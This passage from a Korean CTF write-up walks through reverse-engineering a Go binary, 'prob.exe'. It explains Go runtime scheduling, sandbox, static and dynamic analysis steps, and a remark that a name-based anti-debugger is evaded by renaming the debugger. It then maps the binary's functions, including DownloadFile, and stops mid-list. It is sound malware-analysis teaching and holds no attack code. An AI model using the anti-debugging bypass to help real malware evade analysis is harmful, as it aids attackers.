          &lt;li&gt;&lt;a href=&quot;#142-성공&quot; id=&quot;markdown-toc-142-성공&quot;&gt;1.4.2. 성공!&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-번외-ida-오류-고치기&quot; id=&quot;markdown-toc-2-번외-ida-오류-고치기&quot;&gt;2. 번외: IDA 오류 고치기&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-main_main-함수-분석&quot; id=&quot;markdown-toc-21-main_main-함수-분석&quot;&gt;2.1. main_main 함수 분석&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-main_wdcodev0-v1-함수-분석&quot; id=&quot;markdown-toc-22-main_wdcodev0-v1-함수-분석&quot;&gt;2.2. main_WDcode(v0, v1) 함수 분석&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-golang이란&quot;&gt;0. Golang이란&lt;/h1&gt;

&lt;h2 id=&quot;01-golang의-특징&quot;&gt;0.1. Golang의 특징&lt;/h2&gt;

&lt;p&gt;개발이 가능한 수준으로 공부하고 싶다면 이 &lt;a href=&quot;https://go.dev/doc/&quot;&gt;공식 홈페이지&lt;/a&gt;를 참고하길&lt;/p&gt;

&lt;p&gt;gdb로 go 바이너리를 동적 분석하고 싶다면 이 &lt;a href=&quot;https://go.dev/doc/gdb&quot;&gt;공식 홈페이지를&lt;/a&gt; 참고하길&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;011-개요&quot;&gt;0.1.1. 개요&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;프로그램 { 패키지 { 함수 } }의 구조를 가짐&lt;/li&gt;
  &lt;li&gt;즉, package main 내의 func main 이 컴파일되면, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main.main&lt;/code&gt; 심볼을 가지게 됨&lt;/li&gt;
  &lt;li&gt;Go 런타임은 Golang의 Concurrency를  기존 OS에서 제공하는 프로세스 관리 기능보다 훨씬 효율적으로, 컨텍스트 스위칭 비용을 적게 지불하면서 보장하기 위하여 구현됨&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;012-동시성-지원concurrency-링크&quot;&gt;0.1.2. 동시성 지원(Concurrency, &lt;a href=&quot;https://go.dev/doc/effective_go#concurrency&quot;&gt;링크&lt;/a&gt;)&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;고루틴&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Go가 제공하는 경량 스레드(OS단에서 제공하는 LWP, Light Weight Process를 사용자 단에서 구현한 개념)&lt;/li&gt;
  &lt;li&gt;함수 호출 앞에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;go&lt;/code&gt;를 붙이면 해당 함수는 고루틴으로 실행됨(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;go {function_name}&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;채널&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;고루틴 간 데이터 통신을 위해 사용되는 구조체&lt;/li&gt;
  &lt;li&gt;채널은 버퍼를 가질 수도, 버퍼를 가지지 않을 수도 있음&lt;/li&gt;
  &lt;li&gt;make로 채널을 생성하고, &amp;lt;- 연산자로 데이터를 송수신함(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch:=make( chan string) \n msg:= &amp;lt;-ch&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;여러 채널의 데이터 송수신 지원&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;여러 채널의 데이터 수신을 동시에 기다리되, 데이터가 먼저 도착하는 채널을 채택하는 기능 구현&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;이는 select 문으로 구현되는 개념&lt;/p&gt;

    &lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;ch1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;ch2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
      &lt;span class=&quot;k&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Message from channel 1&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}()&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Message from channel 2&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}()&lt;/span&gt;
    
      &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ch1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;nb&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ch2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;nb&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;고루틴 간 동기화&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;모든 동시성 프로그래밍이 그렇듯, 지정된 그룹의 고루틴이 끝날 때까지 기다리는 기능 / 뮤텍스 제공 / 특정 작업이 한 번만 실행되도록 제한하는 기능을 제공함&lt;/li&gt;
  &lt;li&gt;이는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sync&lt;/code&gt; 패키지를 사용하면 구현할 수 있음&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;고루틴 스케줄링(더 자세히 알고 싶다면 &lt;a href=&quot;https://velog.io/@sunaookamisiroko/Goroutine-%EC%8A%A4%EC%BC%80%EC%A4%84%EB%A7%81&quot;&gt;링크&lt;/a&gt;로)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;mark&gt;이 내용은 그림과 같이 보는 게 더 이해가 쉬우니, 위에 제시한 링크로 들어가서 읽어보는 걸 추천한다.&lt;/mark&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;고루틴은 Go 런타임 스케줄러에 의해 스케줄링됨&lt;/li&gt;
  &lt;li&gt;OS 단에서 &lt;a href=&quot;https://velog.io/@seokjun0915/%EC%9A%B4%EC%98%81%EC%B2%B4%EC%A0%9C-Thread-Scheduling&quot;&gt;스레드 스케줄링&lt;/a&gt;을 할 때를 참고해 보면, 유저 단에서 어떻게 고루틴 스케줄링을 추상화하여 구현했는지 알 수 있음. 즉, &lt;mark&gt;유저 단에서 원하는 스케줄링 방식을 커널 단에서 실제로 실행해줄 수 있게끔 API 역할을 하는 게 Go 런타임 스케줄러임&lt;/mark&gt;&lt;/li&gt;
  &lt;li&gt;기본적으로 N:M 구조로 스레딩이 되고, 현재는 local runqueue 방식으로 멀티코어 스레딩을 지원하며 할당된 local runqueue에 작업이 없으면 그때 global runqueue에 접근해 작업을 가져오는 혼합 방식을 취한 것으로 보인다.(멀티프로세서 스케줄링 방식에서 각 프로세서가 내부 코어별로 스케줄링 큐를 두는 per-core run queues 방식과 비슷함)&lt;/li&gt;
  &lt;li&gt;추가로, work stealing이라는, 운영체제에서의 Lord Balancing(Push &amp;amp; Pull Migration)과 비슷한 개념을 가져와 효율적인 시간 자원 배분을 꾀했다.&lt;/li&gt;
  &lt;li&gt;그러나 이 경우 시스콜로 인해 block 상태에 빠진 OS 스레드가 local runqueue를 가져버리면 Go에서 사용 가능한 OS 스레드의  개수를 정의하는 변수인 GOMAXPROCS가 정의하는 사용 가능한 OS 스레드의 정의와 충돌이 발생하여, 스레드 스케줄링의 주요 요소가 프로세스의 관리를 벗어나 버리는 상황이 발생한다. 즉, work stealing의 올바른 실 구현이 불가능해진다.&lt;/li&gt;
  &lt;li&gt;위 문제의 핵심은 block 상태인 OS 스레드(M)가 local runqueue를 가져버리는 예외 상황으로, 이 상황의 관리를 위해  신규 구조체(p-processor) 개념을 도입하여 p-processor가 local runqueue를 가지고, OS단의 기능인 OS 스레드(M)가 p를 상호간에 토스하도록 했다.&lt;/li&gt;
  &lt;li&gt;이 뒤로도 starvation의 방지, convoy effect의 방지를 위해 Preemptive Scheduling(시분할로 통제되는 자원선점)를 적용하며 그 구현책으로 go runtime 내에 sysmon 데몬 쓰레드를 구현하였다.&lt;/li&gt;
  &lt;li&gt;sysmon 데몬 쓰레드는 고루틴들을 모니터링하고, M에 의한 실행 시간이 10ms를 초과한 고루틴을 잡고 있는 M에게 SIGURG 시그널을 보내 해당 고루틴을 Global runqueue로 보내도록 하는 방안을 채택했다.&lt;/li&gt;
  &lt;li&gt;추가로, Goroutine Locality라고 고루틴이 다른 고루틴을 생성하는 일종의 스레드 계층 구조 지원과 비슷한 기능을 지원한다. 이 경우 발생할 수 있는 poor locality 문제를 해결하기 위해 시분할 상속(Time Slice Inheritance) 기법을 적용했다.&lt;/li&gt;
  &lt;li&gt;또한 모든 M의 local runqueue에 하나 이상의 고루틴이 존재하여 Global Runqueue의 기아상태가 발생할 가능성을 대비하여 loacal runqueue의 polling이 일어날 때마다 ++되는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;schedtick&lt;/code&gt;이라는 변수를 계속해서 살피고, 이것의 값이 61이 될 때 Global runqueue를 반드시 polling해서 고루틴을 가져오도록 했다. 61을 기준으로 삼는 이유는 컴퓨터 시스템에서 소수를 이용하는 그 이유가 맞고, 하필 저 소수인 이유는 성능상 가장 괜찮은 성능을 보여줘서 그렇다. 즉, 수학적 이유와 경험적 이유가 맞물려서 선택된 값이 61이다.&lt;/li&gt;
  &lt;li&gt;만약 고루틴에서 시스콜이 발생해 이를 담당하고 있던 M이 block 상태로 들어간다면, Go Shecduler는 이 M이 가지고 있던 P를 다른 M에게 건네줌으로써 시스콜을 기다릴 필요 없는 local runqueue 내의 다른 고루틴들의 실행을 보장한다. 이 행위 자체가 상당히 큰 리소스를 요하기 때문에, Go Scheduler는 긴 시간이 걸리는 system call이 발생했을 때에만 이런 hand off를 수행한다. 그 외의 짧은 system call들은 그냥 기다리게 내버려두고…&lt;/li&gt;
  &lt;li&gt;물론 이 시스콜이 짧을 거라 생각했는데 너무 오래 걸린다면 고루틴들을 모니터링하고 있던 sysmon에게 걸려서 handoff가 실행된다.&lt;/li&gt;
  &lt;li&gt;OS단의 스레드 관리를 왜 굳이 고 언어 시스템에서 비슷하게 구현해 두었는가? 라는 생각이 들었는데, 일단은 효율성을 최대화한 OS단의 스레드 관리에 대해 더 큰 효율성과 사용자 입장에서 더 직관적인 스레드 관리 기능을 구현하고 싶었던 게 첫째 이유 같고…. 둘째로는 크로스 컴파일이 가능하도록 하기 위해서가 아닌가 싶다. 언제까지나 추측이라 정확한 건 아니다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;013-표준-라이브러리&quot;&gt;0.1.3. 표준 라이브러리&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;go 바이너리를 분석하다 보면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runtime&lt;/code&gt; 으로 시작하는 함수명이 많이 보일 것이다.&lt;/li&gt;
  &lt;li&gt;이는 go가 기본으로 제공하는 표준 라이브러리 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runtime&lt;/code&gt; 하위에 있는 패키지와 함수이다.&lt;/li&gt;
  &lt;li&gt;즉, 그렇기 때문에 정적 분석 시 굳이 들여다볼 필요 없는 함수이기도 하다.&lt;/li&gt;
  &lt;li&gt;라이브러리 개념을 빼고 보면 runtime은 JAVA의 JVM이나 파이썬의 인터프리터와 같은 개념을 하는, 프로그램을 실행될 수 있도록 하는 환경을 의미한다. 즉 이 안에 동시성 지원, 가비지 컬렉션, 동적 데이터 구조의 메모리 관리 등이 다 포함 및 구현된 채로 실행되는 것이다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;02-go-pe-섹션&quot;&gt;0.2. Go PE 섹션&lt;/h2&gt;

&lt;p&gt;Go PE는 전통적인 PE와 그 섹션 헤더 상에서는 차이가 없다고 보아도 무방하다.&lt;/p&gt;

&lt;p&gt;즉, 헤더만으로는 그 둘을 구분할 수 없다.&lt;/p&gt;

&lt;p&gt;Go PE의 헤더상에서 Go runtime과 관련된 문자열이 노출될 수도 있으나, 이는 Obfuscation 등의 기법을 거치면 찾기 어려워진다.&lt;/p&gt;

&lt;p&gt;오히려 정적 분석 툴을 켜서 내부 내용을 확인하면&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;수상할 정도로 함수가 많고&lt;/li&gt;
  &lt;li&gt;뭔가 커널 단 동작을 제어하는 것 같은 함수들이 자꾸 스스로를 콜하며 끝나고&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;하는 것이 보이기 때문에, 바로 Go 바이너리라는 것을 알 수 있다.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-probexe-리버싱&quot;&gt;1. prob.exe 리버싱&lt;/h1&gt;

&lt;p&gt;리버싱을 하는 이유는 뭘까?&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;파일의 목적을 알기 위해&lt;/li&gt;
  &lt;li&gt;즉, 이 파일이 어떤 행위를 하는지 알기 위해&lt;/li&gt;
  &lt;li&gt;더 디테일하게는 누구와 통신하여 어떤 방식으로 내부 루틴을 수행하는지 알아내 특징점을 추출하거나 원하는 대응을 하기 위해&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;사실 이게 다지 않을까?&lt;/p&gt;

&lt;p&gt;그럼 이 이유를 충족하기 위해 분석가는 어떤 행위를 해야 할까?&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;먼저 샌드박스에서 돌려본다.
    &lt;ol&gt;
      &lt;li&gt;네트워크상으로 무엇을 하는지&lt;/li&gt;
      &lt;li&gt;어떤 DLL이나 외부 응용을 콜하는지&lt;/li&gt;
      &lt;li&gt;파일 시스템에서는 무엇이 변경되었는지&lt;/li&gt;
      &lt;li&gt;레지스트리 키에서는 무엇을 변경했는지 등을 알 수 있게 된다.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;그러나 악성 코드가 샌드박스를 탐지하여 정상 행위를 하는 경우도 있고, 샌드박스로는 행위의 결과만을 알 수 있기 때문에 더 많은 정보를 얻기 위해서는 정적으로 접근해야 한다.&lt;/li&gt;
  &lt;li&gt;정적으로 접근할 땐 무엇이 핵심적인 기능을 수행하는 부분인지를 알아내는 것이 목적이다.
    &lt;ol&gt;
      &lt;li&gt;즉, 1의 샌드박스 분석을 통해 알아낸 행위 중, 추가적인 추적이 필요한 부분을 분석해 내부 루틴을 밝히는 것이 목적이다.&lt;/li&gt;
      &lt;li&gt;이를 통해 랜섬웨어의 경우에는 암호화 루틴 해독, 에이전트의 경우에는 C2 추적 등을 할 수 있다.&lt;/li&gt;
      &lt;li&gt;추가적으로 내부 함수 네이밍 규칙이나 시스템 콜 사용 습관 등을 통해 공격자를 라벨링할 수도 있다.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;그러나 내부 문자열 디코딩 후 사용과 같은 루틴이 너무 복잡해 이걸 복호화하는 루틴을 짜다가는 시간이 너무 소요될 것이란 판단이 드는 때가 있다.&lt;/li&gt;
  &lt;li&gt;이럴 때 동적 분석을 수행한다.
    &lt;ol&gt;
      &lt;li&gt;메모리에 올라간 값의 변화, 실시간으로 서버에서 받아오는 값 등을 추적할 수 있다.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;물론 저 순서대로 깔끔하게 떨어질 리는 없고, 2 했다가 3 했다가 5했다가 하는 거긴 한데…&lt;/p&gt;

&lt;p&gt;아무튼 위와 같은 행위를 위해 다양한 테크닉이 필요하고, 이 모든 것을 종합해 리버싱이라 부르는 것이라 생각한다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;10-샌드박스-분석&quot;&gt;1.0. 샌드박스 분석&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;이러면 솔직히 KTX 타고 지나가다 봐도 flag url에 접속해 얻는 flag1 파일에 플래그가 적혀 있을 것 같긴 하다&lt;/p&gt;

&lt;p&gt;그리고 실제로 그랬고&lt;/p&gt;

&lt;p&gt;하지만 나는 이 문제를 통해 리버싱을 공부하는 게 목표니까, 정적-동적 분석까지 해 보려 한다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;11-동적-분석-시도&quot;&gt;1.1. 동적 분석 시도&lt;/h2&gt;

&lt;p&gt;해당 파일에 x64dbg 물려보려 시도하면 디버거가 바로 죽음&lt;/p&gt;

&lt;p&gt;정적으로 까보기 위해 IDA에 띄워봄&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%201.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;위와 같은 깃헙 오픈소스를 사용한 것이 보임&lt;/p&gt;

&lt;p&gt;해당 오픈소스는 golang으로 작성된  &lt;strong&gt;안티디버거&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;인터넷에 검색해 해당 안티디버거의 레포로 들어가 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%202.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;대박 탐지하는 디버거에 치트엔진이 없네&lt;/p&gt;

&lt;p&gt;그리고 디버거 프로그램명을 기반으로 탐지하는 거라 exe name을 바꾸면 탐지 못 한다고도 쓰여 있다.&lt;/p&gt;

&lt;p&gt;==있으나마나한 안티디버거&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;12-정적-분석-시도&quot;&gt;1.2. 정적 분석 시도&lt;/h2&gt;

&lt;p&gt;non-stripped된 바이너리이기 때문에, 내부 패키지와 그 내부의 함수도 복구가 가능하다.&lt;/p&gt;

&lt;p&gt;특히, &lt;strong&gt;Golang으로 프로그램을 작성한다면 반드시 main 패키지가 존재해야 하며, 그 내부에 main 함수가 정의되어야 정상 컴파일이 가능하기 때문에&lt;/strong&gt;, main 패키지에 대한 메타데이터 습득에서부터 분석을 시작하는 것이 좋을 것이다.&lt;/p&gt;

&lt;p&gt;main패키지 하위 함수는 원래 go 컴파일 과정에서 main.{함수명}으로 네이밍되기 때문에(IDA에서는 .을 &lt;em&gt;으로 해석하는 바람에 main&lt;/em&gt;{함수명}이 되지만), functions window에서 main_으로 검색해 보면 아래와 같은 결과가 나온다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-25-fsi-fiesta2024-S2-1/image%203.png&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;즉, main 패키지에는 아래와 같은 함수들이 정의되어 있던 것으로 보인다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WDecode&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run_deferwrap1&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run_Printf_func1&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run_Printf_func2&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run_Printf_func3&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DownloadFile&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DownloadFile_deferwrap1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;main 패키지의 엔트리는 main함수이니, 그로부터 콜 관계를 분석해 보기로 했다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;13-main-패키지-내-함수-간-콜-관계-분석&quot;&gt;1.3. main 패키지 내 함수 간 콜 관계 분석&lt;/h2&gt;

&lt;p&gt;어떤 함수가 진짜 핵심 기능을 수행하는 함수인지 알고 싶다면, 이렇게 non-stripped 되어있고 엔트리가 확실한 바이너리라면 콜 관계를 분석해서 접근하는 게 좋다고 생각한다.&lt;/p&gt;

&lt;p&gt;라고 말하면서 function calls 그래프 띄우려고 한 여섯번정도 요청 날렸는데&lt;/p&gt;

&lt;p&gt;그래프가 안 떠서 생각해 보니 이 바이너리는 함수가 한 만 개 정도 되는 바이너리였고&lt;/p&gt;

&lt;p&gt;큰일났음을 눈치챘을 땐 이미 컴퓨터가 죽은 뒤였다&lt;/p&gt;

&lt;p&gt;다들 golang 프로그램을 분석할 땐 조심하도록 하자&lt;/p&gt;

&lt;p&gt;이것들은 컴퓨터 암살자다&lt;/p&gt;

&lt;p&gt;이상.&lt;/p&gt;

&lt;p&gt;은 무슨… 리버싱은 노가다다&lt;/p&gt;

&lt;p&gt;그래서 수동으로 분석했다.&lt;/p&gt;

&lt;p&gt;open subviews → function calls를 보더라도 알 수 없는 게 있다. 예를 들어 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lea rcx, {function}&lt;/code&gt; 이후에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call rcx&lt;/code&gt; 가 오는 경우가 그렇다.&lt;/p&gt;

&lt;p&gt;그래서 교차검증을 진행해 최대한 완전하게 콜관계를 분석했다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;main
    &lt;ul&gt;
      &lt;li&gt;call
        &lt;ul&gt;
          &lt;li&gt;WDecode&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;xref
        &lt;ul&gt;
          &lt;li&gt;없음(runtime에서 콜함)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;WDecode
    &lt;ul&gt;
      &lt;li&gt;call
        &lt;ul&gt;
          &lt;li&gt;없음&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;xref
        &lt;ul&gt;
          &lt;li&gt;main&lt;/li&gt;
          &lt;li&gt;run&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;run
    &lt;ul&gt;
      &lt;li&gt;call
        &lt;ul&gt;
          &lt;li&gt;WDecode&lt;/li&gt;
          &lt;li&gt;DownloadFile&lt;/li&gt;
          &lt;li&gt;run_Printf_func2&lt;/li&gt;
          &lt;li&gt;run_deferwrap1&lt;/li&gt;
          &lt;li&gt;run_Printf_func1&lt;/li&gt;
          &lt;li&gt;run_Printf_func3&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;xref
        &lt;ul&gt;
          &lt;li&gt;run&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;run_deferwrap1
    &lt;ul&gt;
      &lt;li&gt;call
        &lt;ul&gt;
          &lt;li&gt;없음&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;xref
        &lt;ul&gt;
          &lt;li&gt;run&lt;/li&gt;
          &lt;li&gt;run_deferwrap1&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;run_Printf_func1
    &lt;ul&gt;
      &lt;li&gt;call
        &lt;ul&gt;
          &lt;li&gt;없음&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;xref
        &lt;ul&gt;
          &lt;li&gt;run&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;run_Printf_func2
    &lt;ul&gt;
      &lt;li&gt;call
        &lt;ul&gt;
          &lt;li&gt;없음&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;xref
        &lt;ul&gt;
          &lt;li&gt;run&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;run_Printf_func3
    &lt;ul&gt;
      &lt;li&gt;call
        &lt;ul&gt;
          &lt;li&gt;없음&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;xref
        &lt;ul&gt;
          &lt;li&gt;run&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;DownloadFile
    &lt;ul&gt;
      &lt;li&gt;call
        &lt;ul&gt;
          &lt;li&gt;DownloadFile_deferwrap1&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;xref
        &lt;ul&gt;
          &lt;li&gt;run&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;DownloadFile_deferwrap1
